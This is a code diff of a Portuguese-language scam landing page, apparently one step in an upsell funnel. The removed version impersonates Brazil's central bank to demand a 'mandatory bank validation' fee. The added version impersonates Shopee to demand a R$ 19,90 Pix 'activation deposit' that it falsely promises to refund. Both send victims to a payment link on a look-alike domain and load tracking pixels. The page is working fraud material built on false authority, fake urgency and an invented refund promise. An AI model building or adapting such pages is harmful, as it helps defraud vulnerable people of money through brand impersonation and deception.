@@ -1,165 +1,630 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html><html lang="pt-BR" data-capo="" style="--primary: #ee4d2d;"><head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upsell 5 - Validação Bancária</title>
-   
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Shopee - Ativação da Conta</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
     <script>
-        localStorage.setItem("upsell", "up5");
-        </script>
-   
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
-
-<script>
-  window.pixelId = "682f4a0b17362a4244bf5d3c";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
-
+        window.pixelId = "68478c2e2058440e4c5174d0";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    
+    <script src="js/br.js" defer=""></script>
     <style>
+        /*! modern-normalize v2.0.0 | MIT License | https://github.com/sindresorhus/modern-normalize */
+        *,
+        :after,
+        :before {
+            box-sizing: border-box
+        }
+
+        html {
+            font-family: system-ui, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji;
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            -moz-tab-size: 4;
+            -o-tab-size: 4;
+            tab-size: 4
+        }
+
         body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f8f9fa;
+            margin: 0
+        }
+
+        hr {
+            color: inherit;
+            height: 0
+        }
+
+        abbr[title] {
+            -webkit-text-decoration: underline dotted;
+            text-decoration: underline dotted
+        }
+
+        b,
+        strong {
+            font-weight: bolder
+        }
+
+        code,
+        kbd,
+        pre,
+        samp {
+            font-family: ui-monospace, SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
+            font-size: 1em
+        }
+
+        small {
+            font-size: 80%
+        }
+
+        sub,
+        sup {
+            font-size: 75%;
+            line-height: 0;
+            position: relative;
+            vertical-align: baseline
+        }
+
+        sub {
+            bottom: -.25em
+        }
+
+        sup {
+            top: -.5em
+        }
+
+        table {
+            border-color: inherit;
+            text-indent: 0
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            font-family: inherit;
+            font-size: 100%;
+            line-height: 1.15;
+            margin: 0
+        }
+
+        button,
+        select {
+            text-transform: none
+        }
+
+        [type=button],
+        [type=reset],
+        [type=submit],
+        button {
+            -webkit-appearance: button;
+            appearance: button
+        }
+
+        ::-moz-focus-inner {
+            border-style: none;
+            padding: 0
+        }
+
+        :-moz-focusring {
+            outline: 1px dotted ButtonText
+        }
+
+        :-moz-ui-invalid {
+            box-shadow: none
+        }
+
+        legend {
+            padding: 0
+        }
+
+        progress {
+            vertical-align: baseline
+        }
+
+        ::-webkit-inner-spin-button,
+        ::-webkit-outer-spin-button {
+            height: auto
+        }
+
+        [type=search] {
+            -webkit-appearance: textfield;
+            appearance: textfield;
+            outline-offset: -2px
+        }
+
+        ::-webkit-search-decoration {
+            -webkit-appearance: none
+        }
+
+        ::-webkit-file-upload-button {
+            -webkit-appearance: button;
+            font: inherit
+        }
+
+        summary {
+            display: list-item
+        }
+
+        :root {
+            --primary: #ee4d2d;
+            --red: #ef4444;
+            --green: #27ae60;
+            --shopee-orange: #ee4d2d;
+            --shopee-gradient: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+        }
+
+        body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
             color: #333;
-        }
-
-        .header {
-            background-color: #004080;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .header img {
-            max-width: 150px;
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 40px auto;
-            padding: 30px;
-            background: #ffffff;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            text-align: center;
-        }
-
-        .container h1 {
-            color: #004080;
-            font-size: 26px;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-
-        .container p {
             font-size: 16px;
-            color: #555;
+            font-family: 'Poppins', system-ui, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
             line-height: 1.6;
-            margin-bottom: 20px;
         }
 
-        .highlight {
-            color: #004080;
-            font-weight: bold;
+        #__nuxt,
+        body,
+        html {
+            height: 100%
         }
 
-        .cta {
-            margin-top: 30px;
+        a {
+            color: #1b98e0;
+            text-decoration: none
         }
 
-        .cta button {
-            background-color: #004080;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 5px;
+        a:hover {
             cursor: pointer;
-            transition: background-color 0.3s;
+            text-decoration: underline
         }
 
-        .cta button:hover {
-            background-color: #0056b3;
+        .text-red {
+            color: var(--red)
         }
 
-        .footer {
-            margin-top: 30px;
-            font-size: 14px;
-            color: #777;
+        .text-green {
+            color: var(--green)
         }
 
-        .footer strong {
-            color: #d9534f;
+        .text-primary {
+            color: var(--primary)
         }
 
-        .info-box {
-            background-color: #f1f1f1;
-            border-left: 5px solid #004080;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            font-size: 15px;
-            color: #333;
+        h2 {
+            font-weight: 500
         }
 
-        .info-box h3 {
+        /* Layout Styles */
+        .default-layout {
+            display: grid;
+            grid-template-areas: "top-bar" "content" "footer";
+            grid-template-rows: auto 1fr auto;
+            min-height: 100vh
+        }
+
+        .default-layout .top-bar {
+            grid-area: top-bar
+        }
+
+        .default-layout .content {
+            background-color: #ffffff;
+            grid-area: content;
             margin: 0;
-            font-size: 16px;
-            font-weight: bold;
+        }
+
+        .default-layout .footer {
+            grid-area: footer
+        }
+
+        /* Top Bar Styles */
+        .top-bar {
+            height: 80px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--shopee-gradient);
+            border-bottom: 1px solid hsla(0, 0%, 100%, .3);
+            width: 100%;
+            padding: 40px 30px;
+            box-shadow: 0 6px 25px rgba(238, 77, 45, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .top-bar::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .top-bar .logo {
+            display: flex;
+            gap: 1rem;
+            position: relative;
+            z-index: 2;
+        }
+
+        .top-bar img {
+            height: 80px;
+            width: 80px;
+            max-height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.6));
+            animation: logoGlow 2s ease-in-out infinite alternate;
+            transition: all 0.3s ease;
+        }
+
+        .top-bar img:hover {
+            transform: scale(1.05);
+            filter: drop-shadow(0 0 25px rgba(255, 255, 255, 0.8));
+        }
+
+        @keyframes logoGlow {
+            from { filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.5)); }
+            to { filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.8)); }
+        }
+
+        /* Container Styles */
+        .container {
+            box-sizing: border-box;
+            margin: 0 auto;
+            padding-left: 1rem;
+            padding-right: 1rem;
+            max-width: 480px;
+        }
+
+        @media (min-width:640px) {
+            .container {
+                max-width: 90%
+            }
+        }
+
+        @media (min-width:768px) {
+            .container {
+                max-width: 85%
+            }
+        }
+
+        @media (min-width:1024px) {
+            .container {
+                max-width: 80%
+            }
+        }
+
+        @media (min-width:1280px) {
+            .container {
+                max-width: 600px
+            }
+        }
+
+        /* Modern Card and Component Styling */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+            box-shadow: 0 8px 32px rgba(238, 77, 45, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(238, 77, 45, 0.2);
+        }
+
+        .main-content {
+            display: grid;
+            gap: 2rem;
+            padding: 2.5rem 0;
+        }
+
+        .intro {
+            display: grid;
+            gap: .75rem;
+            text-align: center;
+        }
+
+        .intro .headline {
+            color: var(--primary);
+            font-size: 1.8rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .divider {
+            background-color: var(--primary);
+            border-radius: 10px;
+            height: 2px;
+            width: 80px;
+            margin: 0 auto;
+        }
+
+        .card-sub-title {
+            color: #21236ad0;
+            line-height: 1.5;
+            font-size: 1.1rem;
+        }
+
+        .activation-card {
+            border: 1px solid rgba(238, 77, 45, 0.2);
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            color: #000;
+            box-shadow: 0 8px 32px rgba(238, 77, 45, 0.15);
+            display: grid;
+            gap: 1.5rem;
+            padding: 2rem;
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        .card-aviso {
+            background: var(--shopee-gradient);
+            color: white;
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 700;
+            border-radius: 15px;
+            padding: 1rem 1.5rem;
+            margin-bottom: 1rem;
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .card-aviso-texto {
+            background: rgba(238, 77, 45, 0.1);
+            border: 1px solid rgba(238, 77, 45, 0.2);
+            color: #333;
+            text-align: center;
+            font-size: 1rem;
+            border-radius: 15px;
+            padding: 1.2rem;
+            margin: 1rem 0;
+            line-height: 1.6;
+        }
+
+        .benefits-list {
+            display: grid;
+            gap: 1.2rem;
+            padding: 2rem;
+            background: linear-gradient(135deg, rgba(238, 77, 45, 0.08) 0%, rgba(255, 115, 55, 0.05) 100%);
+            border-radius: 20px;
+            border: 2px solid rgba(238, 77, 45, 0.15);
+            box-shadow: 0 4px 20px rgba(238, 77, 45, 0.1);
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            font-size: 1.1rem;
+            color: #333;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            border: 1px solid rgba(238, 77, 45, 0.1);
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
+        }
+
+        .benefit-item:hover {
+            transform: translateX(5px);
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.15);
+            border-color: rgba(238, 77, 45, 0.2);
+        }
+
+        .benefit-item svg {
+            flex-shrink: 0;
+            filter: drop-shadow(0 2px 4px rgba(238, 77, 45, 0.2));
+        }
+
+        .benefit-item span {
+            font-weight: 500;
+            color: #2c3e50;
+        }
+
+        .value-highlight {
+            color: var(--shopee-orange);
+            font-size: 2.2rem;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(238, 77, 45, 0.3);
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        .pix-section {
+            text-align: center;
+            padding: 1.5rem;
+            background: rgba(238, 77, 45, 0.05);
+            border-radius: 15px;
+            border: 1px solid rgba(238, 77, 45, 0.1);
+        }
+
+        .pix-logo {
+            margin: 1rem 0;
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.1));
+        }
+
+        /* Button Styles */
+        .btn-custom {
+            background: var(--shopee-gradient);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 1.2rem 2rem;
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 20px rgba(238, 77, 45, 0.4);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            margin-top: 1.5rem;
+            text-transform: uppercase;
+        }
+
+        .btn-custom:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(238, 77, 45, 0.4);
+        }
+
+        .btn-custom::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn-custom:hover::before {
+            left: 100%;
+        }
+
+        /* Footer Styles */
+        .footer {
+            border-bottom: 7px solid var(--primary);
+            border-top: 2px solid #edf0ef;
+            color: #ffffffc8;
+            padding: 2rem 0;
+            text-align: center;
+            background: var(--shopee-gradient);
+            box-shadow: 0 -4px 20px rgba(238, 77, 45, 0.3);
+        }
+
+        .footer p {
+            margin: 0
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .intro .headline {
+                font-size: 1.5rem;
+            }
+            
+            .card {
+                padding: 1.5rem;
+                margin: 1rem 0;
+            }
+            
+            .activation-card {
+                padding: 1.5rem;
+            }
+            
+            .value-highlight {
+                font-size: 2rem;
+            }
         }
     </style>
-</head>
-<body>
 
-    <div class="header">
-        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Banco Central">
+<script src="js/br.js" defer=""></script></head><body>
+    <div class="default-layout">
+        <header class="top-bar">
+            <div class="container">
+                <h1 class="logo" style="color: white;">
+                    <img src="images/ChatGPT_Image_29_de_jun._de_2025__22_14_11-removebg-preview.png" alt="Shopee Logo">
+                </h1>
+            </div>
+        </header>
+        
+        <main class="content">
+            <div class="container">
+                <div class="main-content">
+                    <div class="intro">
+                        <span class="headline">Parabéns! Última etapa para ativar sua conta</span>
+                        <div class="divider"></div>
+                        <span class="card-sub-title">Para ativar sua conta digital e movimentar seu empréstimo, é necessário um depósito mínimo que será devolvido imediatamente em sua conta.</span>
+                    </div>
+
+                    <div class="activation-card">
+                        <span class="card-aviso">ATIVAÇÃO OBRIGATÓRIA</span>
+                        <span class="card-aviso-texto">
+                            <strong>Importante:</strong> Esse valor será depositado em sua conta em até 5 minutos após a ativação. Sem esse depósito, sua conta permanecerá inativa.
+                        </span>
+
+                        <div class="benefits-list">
+                            <h4 style="color: var(--shopee-orange); font-weight: 600; margin-bottom: 1rem; text-align: center;">Benefícios da Conta Digital:</h4>
+                            <div class="benefit-item">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 256 256">
+                                    <path fill="#ee4d2d" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"/>
+                                </svg>
+                                <span><strong>Pix 24 horas disponível</strong></span>
+                            </div>
+                            <div class="benefit-item">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 256 256">
+                                    <path fill="#ee4d2d" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"/>
+                                </svg>
+                                <span><strong>Pagamento de boletos sem taxas</strong></span>
+                            </div>
+                            <div class="benefit-item">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 256 256">
+                                    <path fill="#ee4d2d" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"/>
+                                </svg>
+                                <span><strong>Cartão Virtual incluído</strong></span>
+                            </div>
+                            <div class="benefit-item">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 256 256">
+                                    <path fill="#ee4d2d" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"/>
+                                </svg>
+                                <span><strong>Saques em caixas eletrônicos</strong></span>
+                            </div>
+                            <div class="benefit-item">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 256 256">
+                                    <path fill="#ee4d2d" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"/>
+                                </svg>
+                                <span><strong>Atendimento ao cliente 24/7</strong></span>
+                            </div>
+                        </div>
+
+                        <div class="pix-section">
+                            <p style="color: var(--shopee-orange); font-weight: 600; margin-bottom: 1rem;">Ative sua conta depositando via Pix:</p>
+                            <img src="images/pix-106.svg" alt="Pix Logo" width="120" class="pix-logo">
+                            <div class="value-highlight">R$ 19,90</div>
+                            <p style="font-size: 0.9rem; color: #666; margin-top: 1rem;">
+                                <strong>Valor devolvido automaticamente</strong> após ativação
+                            </p>
+                        </div>
+
+                        <a href="https://pay.pagamentosfacilitadosoficial.shop/YEwR3AVKmnbZdKy" style="text-decoration: none;">
+                            <button type="button" class="btn-custom">
+                                Ativar minha conta agora
+                            </button>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <footer class="footer">
+            <p>©2025 Shopee. CNPJ 54.289.446/0001-07.<br>
+            Todos os direitos reservados</p>
+        </footer>
     </div>
 
-    <div class="container">
-        <h1>🔒 Validação Bancária Obrigatória</h1>
-        <p>Para garantir a segurança e regularidade da sua transferência, é necessária a realização de uma <span class="highlight">validação bancária obrigatória</span>, conforme as normas do sistema bancário nacional.</p>
-
-        <div class="info-box">
-            <h3>Por que a validação é necessária?</h3>
-            <p>✔️ Evita transações inválidas ou bloqueios futuros.</p>
-            <p>✔️ Confirma a autenticidade dos seus dados bancários.</p>
-            <p>✔️ Libera sua transferência com total segurança.</p>
-        </div>
-
-        <p><strong>Valor da Taxa:</strong> <span class="highlight">R$ 18,25</span></p>
-        <p><strong>Prazo para Validação:</strong> Até 15 minutos após o pagamento.</p>
-
-        <div class="cta">
-            <button onclick="checkout(event)">VALIDAR AGORA</button>
-        </div>
-
-        <div class="footer">
-            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o registro de sua conta como <strong>irregular</strong>, impactando futuras transações financeiras.
-        </div>
-    </div>
-    <script>
-        function checkout(event) {
-          event.preventDefault();
-      
-          // Captura todos os parâmetros da URL atual
-          const currentParams = window.location.search;
-      
-          // Constrói a URL de destino incluindo os mesmos parâmetros
-          const destino = "https://pay.pagamentosfacilitadosoficial.shop/nWrxGWAxMdw3654" + currentParams;
-      
-          // Redireciona
-          window.location.href = destino;
-        }
-      </script>
-
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 </body></html>
